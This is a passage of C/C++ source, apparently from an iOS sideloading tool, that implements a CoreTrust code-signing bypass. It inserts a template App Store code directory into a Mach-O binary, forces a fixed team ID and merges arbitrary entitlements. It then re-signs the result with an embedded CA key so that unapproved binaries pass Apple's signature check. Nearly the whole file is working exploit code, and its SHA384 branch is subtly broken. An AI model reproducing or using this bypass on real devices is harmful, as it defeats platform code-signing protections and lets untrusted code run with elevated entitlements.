#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <libgen.h>


#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iostream>
#include <memory>
#include <set>
#include <sstream>
#include <string>
#include <vector>
#include <plist/plist.h>

#define LOG(...) //printf(__VA_ARGS__)

enum SecCodeExecSegFlags {
    kSecCodeExecSegMainBinary = 0x001,
    kSecCodeExecSegAllowUnsigned = 0x010,
    kSecCodeExecSegDebugger = 0x020,
    kSecCodeExecSegJit = 0x040,
    kSecCodeExecSegSkipLibraryVal = 0x080,
    kSecCodeExecSegCanLoadCdHash = 0x100,
    kSecCodeExecSegCanExecCdHash = 0x100,
};


#define _assert___(line) \
    #line
#define _assert__(line) \
    _assert___(line)

#ifndef $
#define $(value) value
#endif

#ifdef __EXCEPTIONS
#define _assert_(expr, format, ...) \
    do if (!(expr)) { \
        fprintf(stderr, $("%s(%u): _assert(): " format "\n"), __FILE__, __LINE__, ## __VA_ARGS__); \
        throw $(__FILE__ "(" _assert__(__LINE__) "): _assert(" #expr ")"); \
    } while (false)
#else
// XXX: this is not acceptable
#define _assert_(expr, format, ...) \
    do if (!(expr)) { \
        fprintf(stderr, $("%s(%u): _assert(): " format "\n"), __FILE__, __LINE__, ## __VA_ARGS__); \
        exit(-1); \
    } while (false)
#endif

#define _assert(expr) \
    _assert_(expr, "%s", $(#expr))

class _Scope {
};

template <typename Function_>
class Scope :
    public _Scope
{
  private:
    Function_ function_;

  public:
    Scope(const Function_ &function) :
        function_(function)
    {
    }

    ~Scope() {
        function_();
    }
};

template <typename Function_>
Scope<Function_> _scope(const Function_ &function) {
    return Scope<Function_>(function);
}

#define _scope__(counter, function) \
    __attribute__((__unused__)) \
    const _Scope &_scope ## counter(_scope([&]function))
#define _scope_(counter, function) \
    _scope__(counter, function)
#define _scope(function) \
    _scope_(__COUNTER__, function)

static inline void put(std::streambuf &stream, uint8_t value) {
    _assert(stream.sputc(value) != EOF);
}

static inline void put(std::streambuf &stream, const void *data, size_t size) {
    _assert(stream.sputn(static_cast<const char *>(data), size) == size);
}

static inline void put(std::streambuf &stream, const std::string &data) {
    return put(stream, data.data(), data.size());
}

template <typename Type_>
Type_ Align(Type_ value, size_t align) {
    value += align - 1;
    value /= align;
    value *= align;
    return value;
}

static const uint8_t PageShift_(0x0c);
static const uint32_t PageSize_(1 << PageShift_);

static inline unsigned bytes(uint64_t value) {
    if (!value) return 1;
    return (64 - __builtin_clzll(value) + 7) / 8;
}

static void put(std::streambuf &stream, uint64_t value, size_t length) {
    length *= 8;
    do put(stream, uint8_t(value >> (length -= 8)));
    while (length != 0);
}

static void der(std::streambuf &stream, uint64_t value) {
    if (value < 128)
        put(stream, value);
    else {
        unsigned length(bytes(value));
        put(stream, 0x80 | length);
        put(stream, value, length);
    }
}

static std::string der(uint8_t tag, const char *value, size_t length) {
    std::stringbuf data;
    put(data, tag);
    der(data, length);
    put(data, value, length);
    return data.str();
}

static std::string der(uint8_t tag, const char *value) {
    return der(tag, value, strlen(value)); }
static std::string der(uint8_t tag, const std::string &value) {
    return der(tag, value.data(), value.size()); }

template <typename Type_>
static void der_(std::stringbuf &data, const Type_ &values) {
    size_t size(0);
    for (const auto &value : values)
        size += value.size();
    der(data, size);
    for (const auto &value : values)
        put(data, value);
}

static std::string der(const std::vector<std::string> &values) {
    std::stringbuf data;
    put(data, 0x30);
    der_(data, values);
    return data.str();
}

static std::string der(const std::multiset<std::string> &values) {
    std::stringbuf data;
    put(data, 0x31);
    der_(data, values);
    return data.str();
}

static std::string der(const std::pair<std::string, std::string> &value) {
    const auto key(der(0x0c, value.first));
    std::stringbuf data;
    put(data, 0x30);
    der(data, key.size() + value.second.size());
    put(data, key);
    put(data, value.second);
    return data.str();
}

static std::string der(plist_t data) {
    switch (const auto type = plist_get_node_type(data)) {
        case PLIST_BOOLEAN: {
            uint8_t value(0);
            plist_get_bool_val(data, &value);

            std::stringbuf data;
            put(data, 0x01);
            der(data, 1);
            put(data, value != 0 ? 1 : 0);
            return data.str();
        } break;

        case PLIST_UINT: {
            uint64_t value;
            plist_get_uint_val(data, &value);
            const auto length(bytes(value));

            std::stringbuf data;
            put(data, 0x02);
            der(data, length);
            put(data, value, length);
            return data.str();
        } break;

        case PLIST_REAL: {
            fprintf(stderr, "ldid: Invalid plist entry type\n");
            exit(1);
        } break;

        case PLIST_DATE: {
            fprintf(stderr, "ldid: Invalid plist entry type\n");
            exit(1);
        } break;

        case PLIST_DATA: {
            char *value;
            uint64_t length;
            plist_get_data_val(data, &value, &length);
            _scope({ free(value); });
            return der(0x04, value, length);
        } break;

        case PLIST_STRING: {
            char *value;
            plist_get_string_val(data, &value);
            _scope({ free(value); });
            return der(0x0c, value);
        } break;

        case PLIST_ARRAY: {
            std::vector<std::string> values;
            for (auto e(plist_array_get_size(data)), i(decltype(e)(0)); i != e; ++i)
                values.push_back(der(plist_array_get_item(data, i)));
            return der(values);
        } break;

        case PLIST_DICT: {
            std::multiset<std::string> values;

            plist_dict_iter iterator(NULL);
            plist_dict_new_iter(data, &iterator);
            _scope({ free(iterator); });

            for (;;) {
                char *key(NULL);
                plist_t value(NULL);
                plist_dict_next_item(data, iterator, &key, &value);
                if (key == NULL)
                    break;
                _scope({ free(key); });
                values.insert(der(std::make_pair(key, der(value))));
            }

            return der(values);
        } break;

        default: {
            fprintf(stderr, "ldid: Unsupported plist type %d", type);
            exit(1);
        } break;
    }
}


static bool Starts(const std::string &lhs, const std::string &rhs) {
    return lhs.size() >= rhs.size() && lhs.compare(0, rhs.size(), rhs) == 0;
}

static plist_t plist(const std::string &data) {
    if (data.empty())
        return plist_new_dict();
    plist_t plist(NULL);
    if (Starts(data, "bplist00"))
        plist_from_bin(data.data(), data.size(), &plist);
    else
        plist_from_xml(data.data(), data.size(), &plist);
    if (plist == NULL) {
        fprintf(stderr, "ldid: Failed to parse plist\n");
        exit(1);
    }
    return plist;
}

int _merger(plist_t target, plist_t source)
{
    if (!target || !source) {
        return -1;
    }
    
    plist_type target_type = plist_get_node_type(target);
    plist_type source_type = plist_get_node_type(source);
    
    if (target_type != source_type) {
        return -1;
    }
    
    if (target_type == PLIST_DICT)
    {
        plist_dict_iter iter = NULL;
        plist_dict_new_iter(source, &iter);
        if (!iter) {
            return -1;
        }
        
        char *key = NULL;
        plist_t src_val = NULL;
        
        while (1) {
            plist_dict_next_item(source, iter, &key, &src_val);
            if (!src_val) {
                break;
            }
            
            plist_t target_val = plist_dict_get_item(target, key);
            plist_type src_val_type = plist_get_node_type(src_val);
            
            if (target_val) {
                plist_type target_val_type = plist_get_node_type(target_val);
                
                if ((src_val_type == PLIST_DICT && target_val_type == PLIST_DICT) ||
                    (src_val_type == PLIST_ARRAY && target_val_type == PLIST_ARRAY)) {
                    assert(_merger(target_val, src_val) == 0);
                } else {
                    plist_dict_set_item(target, key, plist_copy(src_val));
                }
            } else {
                plist_dict_set_item(target, key, plist_copy(src_val));
            }
            
            free(key);
            key = NULL;
        }
        
        free(iter);
        
    } else if (target_type == PLIST_ARRAY) 
    {
        uint32_t source_size = plist_array_get_size(source);
        for (uint32_t i = 0; i < source_size; i++) {
            plist_t src_item = plist_array_get_item(source, i);
            plist_array_append_item(target, plist_copy(src_item));
        }
    }
    
    return 0;
}

struct Baton {
    std::string entitlements_;
    std::string derformat_;
};

Baton merge_entitlements(std::string entitlements, const char* extra, const char* strip)
{
    auto combined = plist(entitlements);

    _scope({ plist_free(combined); });
    if (plist_get_node_type(combined) != PLIST_DICT) {
        fprintf(stderr, "ldid: Existing entitlements are in wrong format\n");
        exit(1);
    };

    auto merging(plist(extra));

    _scope({ plist_free(merging); });
    if (plist_get_node_type(merging) != PLIST_DICT) {
        fprintf(stderr, "ldid: Entitlements need a root key of dict\n");
        exit(1);
    };

    assert(_merger(combined, merging) == 0);

    if(strip) {
        auto strping(plist(strip));
        for(int i=0; i<plist_array_get_size(strping); i++) {
            char *key(NULL);
            plist_get_string_val(plist_array_get_item(strping, i), &key);
            plist_dict_remove_item(combined, key);
        }
    }

    plist_dict_remove_item(combined, "com.apple.private.skip-library-validation");
    plist_dict_remove_item(combined, "com.apple.private.cs.debugger");
    plist_dict_remove_item(combined, "dynamic-codesigning");

    uint32_t size;
    char *xml(NULL);
    plist_to_xml(combined, &xml, &size);
    _scope({ free(xml); });

    Baton baton;
    baton.derformat_ = der(combined);
    baton.entitlements_.assign(xml, size);

    return baton;
}


extern "C" {
#include <CoreFoundation/CoreFoundation.h>
#include <choma/CSBlob.h>
#include <choma/MachOByteOrder.h>
#include <choma/MachO.h>
#include <choma/Host.h>
#include <choma/MemoryStream.h>
#include <choma/FileStream.h>
#include <choma/BufferedStream.h>
#include <choma/CodeDirectory.h>
#include <choma/Base64.h>

#include "Templates/CADetails.h"
#include "Templates/DERTemplate.h"
#include "Templates/AppStoreCodeDirectory.h"
#include "Templates/TemplateSignatureBlob.h"

#include <openssl/pem.h>
#include <openssl/err.h>
#include <openssl/cms.h>

#define LOG(...)

int update_signature_blob(CS_DecodedSuperBlob *superblob)
{
    CS_DecodedBlob *sha1CD = csd_superblob_find_blob(superblob, CSSLOT_CODEDIRECTORY, NULL);
    if (!sha1CD) {
        printf("Could not find SHA1 CodeDirectory blob!\n");
        return -1;
    }
    CS_DecodedBlob *sha256CD = csd_superblob_find_blob(superblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);
    if (!sha256CD) {
        printf("Could not find SHA256 CodeDirectory blob!\n");
        return -1;
    }

    uint8_t sha1CDHash[CC_SHA1_DIGEST_LENGTH];
    uint8_t sha256CDHash[CC_SHA256_DIGEST_LENGTH];

    {
        size_t dataSizeToRead = csd_blob_get_size(sha1CD);
        uint8_t *data = (uint8_t*)malloc(dataSizeToRead);
        memset(data, 0, dataSizeToRead);
        csd_blob_read(sha1CD, 0, dataSizeToRead, data);
        CC_SHA1(data, (CC_LONG)dataSizeToRead, sha1CDHash);
        free(data);
        LOG("SHA1 hash: ");
        for (int i = 0; i < CC_SHA1_DIGEST_LENGTH; i++) {
            LOG("%02x", sha1CDHash[i]);
        }
        LOG("\n");
    }

    {
        size_t dataSizeToRead = csd_blob_get_size(sha256CD);
        uint8_t *data = (uint8_t*)malloc(dataSizeToRead);
        memset(data, 0, dataSizeToRead);
        csd_blob_read(sha256CD, 0, dataSizeToRead, data);
        CC_SHA256(data, (CC_LONG)dataSizeToRead, sha256CDHash);
        free(data);
        LOG("SHA256 hash: ");
        for (int i = 0; i < CC_SHA256_DIGEST_LENGTH; i++) {
            LOG("%02x", sha256CDHash[i]);
        }
        LOG("\n");
    }

    const uint8_t *cmsDataPtr = AppStoreSignatureBlob + offsetof(CS_GenericBlob, data);
    size_t cmsDataSize = AppStoreSignatureBlob_len - sizeof(CS_GenericBlob);
    CMS_ContentInfo *cms = d2i_CMS_ContentInfo(NULL, (const unsigned char**)&cmsDataPtr, cmsDataSize);
    if (!cms) {
        printf("Failed to parse CMS blob: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Load private key
    FILE* privateKeyFile = fmemopen(CAKey, CAKeyLength, "r");
    if (!privateKeyFile) {
        printf("Failed to open private key file!\n");
        return -1;
    }
    EVP_PKEY* privateKey = PEM_read_PrivateKey(privateKeyFile, NULL, NULL, NULL);
    fclose(privateKeyFile);
    if (!privateKey) {
        printf("Failed to read private key file!\n");
        return -1;
    }

    // Load certificate
    FILE* certificateFile = fmemopen(CACert, CACertLength, "r");
    if (!certificateFile) {
        printf("Failed to open certificate file!\n");
        return -1;
    }
    X509* certificate = PEM_read_X509(certificateFile, NULL, NULL, NULL);
    fclose(certificateFile);
    if (!certificate) {
        printf("Failed to read certificate file!\n");
        return -1;
    }

    // Add signer
    CMS_SignerInfo* newSigner = CMS_add1_signer(cms, certificate, privateKey, EVP_sha256(), CMS_PARTIAL | CMS_REUSE_DIGEST | CMS_NOSMIMECAP);
    if (!newSigner) {
        printf("Failed to add signer: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    CFMutableArrayRef cdHashesArray = CFArrayCreateMutable(NULL, 2, &kCFTypeArrayCallBacks);
    if (!cdHashesArray) {
        printf("Failed to create CDHashes array!\n");
        return -1;
    }

    CFDataRef sha1CDHashData = CFDataCreate(NULL, sha1CDHash, CC_SHA1_DIGEST_LENGTH);
    if (!sha1CDHashData) {
        printf("Failed to create CFData from SHA1 CDHash!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFArrayAppendValue(cdHashesArray, sha1CDHashData);
    CFRelease(sha1CDHashData);

    // In this plist, the SHA256 hash is truncated to SHA1 length
    CFDataRef sha256CDHashData = CFDataCreate(NULL, sha256CDHash, CC_SHA1_DIGEST_LENGTH);
    if (!sha256CDHashData) {
        printf("Failed to create CFData from SHA256 CDHash!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFArrayAppendValue(cdHashesArray, sha256CDHashData);
    CFRelease(sha256CDHashData);
    
    CFMutableDictionaryRef cdHashesDictionary = CFDictionaryCreateMutable(NULL, 1, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (!cdHashesDictionary) {
        printf("Failed to create CDHashes dictionary!\n");
        CFRelease(cdHashesArray);
        return -1;
    }
    CFDictionarySetValue(cdHashesDictionary, CFSTR("cdhashes"), cdHashesArray);
    CFRelease(cdHashesArray);

    CFErrorRef error = NULL;
    CFDataRef cdHashesDictionaryData = CFPropertyListCreateData(NULL, cdHashesDictionary, kCFPropertyListXMLFormat_v1_0, 0, &error);
    CFRelease(cdHashesDictionary);
    if (!cdHashesDictionaryData) {
        // CFStringGetCStringPtr, unfortunately, does not always work
        CFStringRef errorString = CFErrorCopyDescription(error);
        CFIndex maxSize = CFStringGetMaximumSizeForEncoding(CFStringGetLength(errorString), kCFStringEncodingUTF8) + 1;
        char *buffer = (char *)malloc(maxSize);
        if (CFStringGetCString(errorString, buffer, maxSize, kCFStringEncodingUTF8)) {
            printf("Failed to encode CDHashes plist: %s\n", buffer);
        } else {
            printf("Failed to encode CDHashes plist: unserializable error\n");
        }
        free(buffer);
        return -1;
    }

    // Add text CDHashes attribute
    if (!CMS_signed_add1_attr_by_txt(newSigner, "1.2.840.113635.100.9.1", V_ASN1_OCTET_STRING, CFDataGetBytePtr(cdHashesDictionaryData), CFDataGetLength(cdHashesDictionaryData))) {
        printf("Failed to add text CDHashes attribute: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Create DER-encoded CDHashes (see DERTemplate.h for details)
    uint8_t cdHashesDER[78];
    memset(cdHashesDER, 0, sizeof(cdHashesDER));
    memcpy(cdHashesDER, CDHashesDERTemplate, sizeof(CDHashesDERTemplate));
    memcpy(cdHashesDER + CDHASHES_DER_SHA1_OFFSET, sha1CDHash, CC_SHA1_DIGEST_LENGTH);
    memcpy(cdHashesDER + CDHASHES_DER_SHA256_OFFSET, sha256CDHash, CC_SHA256_DIGEST_LENGTH);

    // Add DER CDHashes attribute
    if (!CMS_signed_add1_attr_by_txt(newSigner, "1.2.840.113635.100.9.2", V_ASN1_SEQUENCE, cdHashesDER, sizeof(cdHashesDER))) {
        printf("Failed to add CDHashes attribute: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Sign the CMS structure
    if (!CMS_SignerInfo_sign(newSigner)) {
        printf("Failed to sign CMS structure: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Encode the CMS structure into DER
    uint8_t *newCMSData = NULL;
    int newCMSDataSize = i2d_CMS_ContentInfo(cms, &newCMSData);
    if (newCMSDataSize <= 0) {
        printf("Failed to encode CMS structure: %s!\n", ERR_error_string(ERR_get_error(), NULL));
        return -1;
    }

    // Copy CMS data into a new blob
    uint32_t newCMSDataBlobSize = sizeof(CS_GenericBlob) + newCMSDataSize;
    CS_GenericBlob *newCMSDataBlob = (CS_GenericBlob*)malloc(newCMSDataBlobSize);
    newCMSDataBlob->magic = HOST_TO_BIG((uint32_t)CSMAGIC_BLOBWRAPPER);
    newCMSDataBlob->length = HOST_TO_BIG(newCMSDataBlobSize);
    memcpy(newCMSDataBlob->data, newCMSData, newCMSDataSize);
    free(newCMSData);

    // Remove old signature blob if it exists
    CS_DecodedBlob *oldSignatureBlob = csd_superblob_find_blob(superblob, CSSLOT_SIGNATURESLOT, NULL);
    if (oldSignatureBlob) {
        csd_superblob_remove_blob(superblob, oldSignatureBlob);
        csd_blob_free(oldSignatureBlob);
    }

    // Append new signature blob
    CS_DecodedBlob *signatureBlob = csd_blob_init(CSSLOT_SIGNATURESLOT, newCMSDataBlob);
    free(newCMSDataBlob);

    // Append new signature blob
    return csd_superblob_append_blob(superblob, signatureBlob);
}

uint32_t magicTable[] = {
    CSMAGIC_CODEDIRECTORY,
    0,
    CSMAGIC_REQUIREMENT,
    0,
    0,
    CSMAGIC_EMBEDDED_ENTITLEMENTS,
    0,
    CSMAGIC_EMBEDDED_DER_ENTITLEMENTS
};

int reset_blob(CS_DecodedSuperBlob *decodedSuperblob, CS_DecodedBlob *realCodeDirBlob, uint32_t type, void* data, int size)
{
    CS_CodeDirectory realCodeDir;
    csd_blob_read(realCodeDirBlob, 0, sizeof(realCodeDir), &realCodeDir);
    CODE_DIRECTORY_APPLY_BYTE_ORDER(&realCodeDir, HOST_TO_BIG_APPLIER);

    CS_DecodedBlob *blob = csd_superblob_find_blob(decodedSuperblob, type, NULL);
    if(!blob) {
        assert(type < (sizeof(magicTable)/sizeof(magicTable[0])));
        assert(magicTable[type] != 0);

        uint32_t magic = magicTable[type];
        uint32_t length = sizeof(CS_GenericBlob);
        CS_GenericBlob genblob = {HOST_TO_BIG(magic), HOST_TO_BIG(length)};
        blob = csd_blob_init(type, &genblob);

        //work, append to CSSLOT_ENTITLEMENTS
        // CS_DecodedBlob *entblob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS, NULL);
        // csd_superblob_insert_blob_after_blob(decodedSuperblob, blob, entblob);

        //work, as last blob
        // csd_superblob_append_blob(decodedSuperblob, blob);

        //work, as the first blob
        csd_superblob_insert_blob_at_index(decodedSuperblob, blob, 0);


        if(realCodeDir.nSpecialSlots < type) {
            uint8_t hash[realCodeDir.hashSize];
            memset(hash, 0, realCodeDir.hashSize);
            for(int i=realCodeDir.nSpecialSlots; i<type; i++)
                assert(csd_blob_insert(realCodeDirBlob, realCodeDir.hashOffset - i*sizeof(hash), sizeof(hash), hash) == 0);

            realCodeDir.hashOffset += sizeof(hash) * (type - realCodeDir.nSpecialSlots);
            realCodeDir.nSpecialSlots = type;

            uint32_t newHashOffset = HOST_TO_BIG(realCodeDir.hashOffset);
            csd_blob_write(realCodeDirBlob, offsetof(CS_CodeDirectory,hashOffset), sizeof(newHashOffset), &newHashOffset);
            uint32_t newSpecialSlots = HOST_TO_BIG(realCodeDir.nSpecialSlots);
            csd_blob_write(realCodeDirBlob, offsetof(CS_CodeDirectory,nSpecialSlots), sizeof(newSpecialSlots), &newSpecialSlots);

            //update other offsets in CodeDir?
        }
    }

    csd_blob_write(blob, offsetof(CS_GenericBlob,data), size, data);

    int blobsize = csd_blob_get_size(blob);
    CS_GenericBlob* genblob = (CS_GenericBlob*)malloc(blobsize);
    memset(genblob, 0, blobsize);
    memory_stream_read(blob->stream, 0, blobsize, genblob);

    void* hashdata = genblob;
    int hashsize = blobsize;

    bool calcWorked = false;

    uint8_t hash[realCodeDir.hashSize];
    switch (realCodeDir.hashType) {
        case CS_HASHTYPE_SHA160_160: {
            CC_SHA1(hashdata, (CC_LONG)hashsize, hash);
            calcWorked = true;
            break;
        }

        case CS_HASHTYPE_SHA256_256:
        case CS_HASHTYPE_SHA256_160: {
            uint8_t fullHash[CC_SHA256_DIGEST_LENGTH];
            CC_SHA256(hashdata, (CC_LONG)hashsize, fullHash);
            memcpy(hash, fullHash, realCodeDir.hashSize);
            calcWorked = true;
            break;
        }

        case CS_HASHTYPE_SHA384_384: {
            uint8_t fullHash[CC_SHA384_DIGEST_LENGTH];
            CC_SHA256(hashdata, (CC_LONG)hashsize, fullHash);
            memcpy(hash, fullHash, realCodeDir.hashSize);
            calcWorked = true;
            break;
        }
    }

    free(genblob);
    genblob = NULL;


    assert(calcWorked==true);

    int slot = - type;
    csd_blob_write(realCodeDirBlob, realCodeDir.hashOffset + (slot * realCodeDir.hashSize), realCodeDir.hashSize, hash);

    return 0;
}

int apply_coretrust_bypass(const char *machoPath, const char* extra_entitlements, const char* strip_entitlements, const char* teamID)
{
    MachO *macho = macho_init_for_writing(machoPath);
    if (!macho) return -1;
    
    CS_SuperBlob *superblob = macho_read_code_signature(macho);
    if (!superblob) {
        printf("Error: no code signature found, please fake-sign the binary at minimum before running the bypass.\n");
        return -1;
    }

    CS_DecodedSuperBlob *decodedSuperblob = csd_superblob_decode(superblob);
    uint64_t originalCodeSignatureSize = BIG_TO_HOST(superblob->length);
    free(superblob);

    CS_DecodedBlob *realCodeDirBlob = NULL;
    CS_DecodedBlob *mainCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_CODEDIRECTORY, NULL);
    CS_DecodedBlob *alternateCodeDirBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ALTERNATE_CODEDIRECTORIES, NULL);

    if (!mainCodeDirBlob) {
        printf("Error: Unable to find code directory, make sure the input binary is ad-hoc signed?\n");
        return -1;
    }

    // We need to determine which code directory to transfer to the new binary
    if (alternateCodeDirBlob) {
        // If an alternate code directory exists, use that and remove the main one from the superblob
        realCodeDirBlob = alternateCodeDirBlob;
        csd_superblob_remove_blob(decodedSuperblob, mainCodeDirBlob);
        csd_blob_free(mainCodeDirBlob);
    }
    else {
        // Otherwise use the main code directory
        realCodeDirBlob = mainCodeDirBlob;
    }

    if (csd_code_directory_get_hash_type(realCodeDirBlob) != CS_HASHTYPE_SHA256_256) {
        printf("Error: Alternate code directory is not SHA256, bypass won't work!\n");
        return -1;
    }

    LOG("Applying App Store code directory...\n");

    // Append real code directory as alternateCodeDirectory at the end of superblob
    csd_superblob_remove_blob(decodedSuperblob, realCodeDirBlob);
    csd_blob_set_type(realCodeDirBlob, CSSLOT_ALTERNATE_CODEDIRECTORIES);
    csd_superblob_append_blob(decodedSuperblob, realCodeDirBlob);

    // Insert AppStore code directory as main code directory at the start
    CS_DecodedBlob *appStoreCodeDirectoryBlob = csd_blob_init(CSSLOT_CODEDIRECTORY, (CS_GenericBlob *)AppStoreCodeDirectory);
    csd_superblob_insert_blob_at_index(decodedSuperblob, appStoreCodeDirectoryBlob, 0);

    LOG("Adding new signature blob...\n");
    CS_DecodedBlob *signatureBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_SIGNATURESLOT, NULL);
    if (signatureBlob) {
        // Remove existing signatureBlob if existant
        csd_superblob_remove_blob(decodedSuperblob, signatureBlob);
        csd_blob_free(signatureBlob);
    }

    // After Modification:
    // 1. App Store CodeDirectory (SHA1)
    // ?. Requirements
    // ?. Entitlements
    // ?. DER entitlements
    // 5. Actual CodeDirectory (SHA256)
    // 6. Signature blob

    LOG("Updating TeamID...\n");

    // Get team ID from AppStore code directory
    // For the bypass to work, both code directories need to have the same team ID
    // char *appStoreTeamID = csd_code_directory_copy_team_id(appStoreCodeDirectoryBlob, NULL);
    char *appStoreTeamID = strdup("T8ALTGMVXN"); //fixed TeamID
    if (!appStoreTeamID) {
        printf("Error: Unable to determine AppStore Team ID\n");
        return -1;
    }

    if(teamID) {
        free(appStoreTeamID);
        appStoreTeamID = strdup(teamID);
        LOG("Overriding TeamID with provided one: %s\n", teamID);
    }

    // Set the team ID of the real code directory to the AppStore one
    if (csd_code_directory_set_team_id(realCodeDirBlob, appStoreTeamID) != 0) {
        printf("Error: Failed to set Team ID\n");
        return -1;
    }

    LOG("TeamID set to %s!\n", appStoreTeamID);
    free(appStoreTeamID);

    // Set flags to 0 to remove any problematic flags (such as the 'adhoc' flag in bit 2)
    csd_code_directory_set_flags(realCodeDirBlob, 0);

    if(extra_entitlements)
    {
        CS_DecodedBlob *entBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_ENTITLEMENTS, NULL);
        CS_DecodedBlob *derBlob = csd_superblob_find_blob(decodedSuperblob, CSSLOT_DER_ENTITLEMENTS, NULL);
        
        //some library may miss entitlement or der-entitlement, so mismatch with the fake MainCD
        if(macho->machHeader.filetype != MH_EXECUTE) 
        {
            CS_CodeDirectory realCodeDir;
            csd_blob_read(realCodeDirBlob, 0, sizeof(realCodeDir), &realCodeDir);
            CODE_DIRECTORY_APPLY_BYTE_ORDER(&realCodeDir, HOST_TO_BIG_APPLIER);

            if(entBlob && !derBlob) {
                //work, remove blob and empty the slot hash
                uint8_t hash[realCodeDir.hashSize];
                memset(hash, 0, realCodeDir.hashSize);
                assert(csd_blob_write(realCodeDirBlob, realCodeDir.hashOffset - CSSLOT_ENTITLEMENTS*sizeof(hash), sizeof(hash), hash) == 0);
                assert(csd_superblob_remove_blob(decodedSuperblob, entBlob) == 0);
            }

            if(derBlob && !entBlob) {
                //work?
                uint8_t hash[realCodeDir.hashSize];
                memset(hash, 0, realCodeDir.hashSize);
                assert(csd_blob_write(realCodeDirBlob, realCodeDir.hashOffset - CSSLOT_DER_ENTITLEMENTS*sizeof(hash), sizeof(hash), hash) == 0);
                assert(csd_superblob_remove_blob(decodedSuperblob, derBlob) == 0);
            }

            //work, but may missing some slots
            // realCodeDir.nSpecialSlots -= 1;
            // uint32_t newSpecialSlots = HOST_TO_BIG(realCodeDir.nSpecialSlots);
            // csd_blob_write(realCodeDirBlob, offsetof(CS_CodeDirectory,nSpecialSlots), sizeof(newSpecialSlots), &newSpecialSlots);
        }
        
        if(macho->machHeader.filetype == MH_EXECUTE) 
        {
            std::string entitlements;

            if(entBlob) {

                int blobsize = csd_blob_get_size(entBlob);
                CS_GenericBlob* blob = (CS_GenericBlob*)malloc(blobsize);
                memset(blob, 0, blobsize);
                memory_stream_read(entBlob->stream, 0, blobsize, blob);

                entitlements.assign(blob->data, blobsize-sizeof(CS_GenericBlob));

                free(blob);
            }

            Baton baton = merge_entitlements(entitlements, extra_entitlements, strip_entitlements);

            reset_blob(decodedSuperblob, realCodeDirBlob, CSSLOT_ENTITLEMENTS, (void*)baton.entitlements_.data(), baton.entitlements_.size());
            //have to update CodeDir...
            reset_blob(decodedSuperblob, realCodeDirBlob, CSSLOT_DER_ENTITLEMENTS, (void*)baton.derformat_.data(), baton.derformat_.size());
            //have to update CodeDir...
        
        }
    }

    LOG("Allocating code slot hashes...\n");
    csd_code_directory_alloc(realCodeDirBlob, macho);
    
    int ret = 0;

    // 6. Signature blob
    LOG("Doing initial signing to calculate size...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    LOG("Encoding unsigned superblob...\n");
    CS_SuperBlob *encodedSuperblobUnsigned = csd_superblob_encode(decodedSuperblob);

    LOG("Updating load commands...\n");
    if (update_load_commands_for_coretrust_bypass(macho, encodedSuperblobUnsigned, originalCodeSignatureSize, memory_stream_get_size(macho->stream)) != 0) {
        printf("Error: failed to update load commands!\n");
        return -1;
    }
    free(encodedSuperblobUnsigned);

    LOG("Updating code slot hashes...\n");
    void csd_code_directory_update_fast(CS_DecodedBlob *codeDirBlob, MachO *macho);
    csd_code_directory_update_fast(realCodeDirBlob, macho);

    LOG("Signing binary...\n");
    ret = update_signature_blob(decodedSuperblob);
    if(ret == -1) {
        printf("Error: failed to create new signature blob!\n");
        return -1;
    }

    LOG("Encoding signed superblob...\n");
    CS_SuperBlob *newSuperblob = csd_superblob_encode(decodedSuperblob);

    LOG("Writing superblob to MachO...\n");
    // Write the new signed superblob to the MachO
    macho_replace_code_signature(macho, newSuperblob);

    csd_superblob_free(decodedSuperblob);
    free(newSuperblob);
    
    macho_free(macho);
    return 0;
}

#include <choma/FAT.h>
#include <choma/MachO.h>
#include <choma/FileStream.h>
#include <choma/Host.h>
#include <copyfile.h>
#include <sys/clonefile.h>

char *extract_preferred_slice(const char *fatPath)
{
    FAT *fat = fat_init_from_path(fatPath);
    if (!fat) return NULL;
    MachO *macho = fat_find_preferred_slice(fat);
    if (!macho) return NULL;
    
    char *temp = strdup("/tmp/XXXXXX");
    int fd = mkstemp(temp);

    MemoryStream *outStream = file_stream_init_from_path(temp, 0, 0, FILE_STREAM_FLAG_WRITABLE | FILE_STREAM_FLAG_AUTO_EXPAND);
    MemoryStream *machoStream = macho_get_stream(macho);
    memory_stream_copy_data(machoStream, 0, outStream, 0, memory_stream_get_size(machoStream));

    fat_free(fat);
    memory_stream_free(outStream);
    close(fd);
    return temp;
}


int realstore(const char* path, const char* extra_entitlements, const char* strip_entitlements, const char* teamID)
{
    struct stat st;
    assert(stat(path, &st) == 0);

    int fd = open(path, O_RDONLY);
    if(fd < 0) {
        perror("open");
        return -1;
    }

    uint32_t magic = 0;
    assert(read(fd, &magic, sizeof(magic)) == sizeof(magic));

    close(fd);

    char *machoPath = NULL;

    if(magic == MH_MAGIC_64)
    {
        machoPath = strdup(tmpnam(NULL));
        if(clonefile(path, machoPath, 0) != 0) {
            perror("clonefile");
            return -1;
        }
    }
    else
    {
        machoPath = extract_preferred_slice(path);
        if(!machoPath) {
            printf("extracted failed %s\n", path);
            return -1;
        }

        LOG("Extracted %s best slice to %s\n", (path), machoPath);
    }

    LOG("Applying CoreTrust bypass...\n");

    if (apply_coretrust_bypass(machoPath, extra_entitlements, strip_entitlements, teamID) != 0) {
        fprintf(stderr, "Failed applying CoreTrust bypass\n");
        return -1;
    }

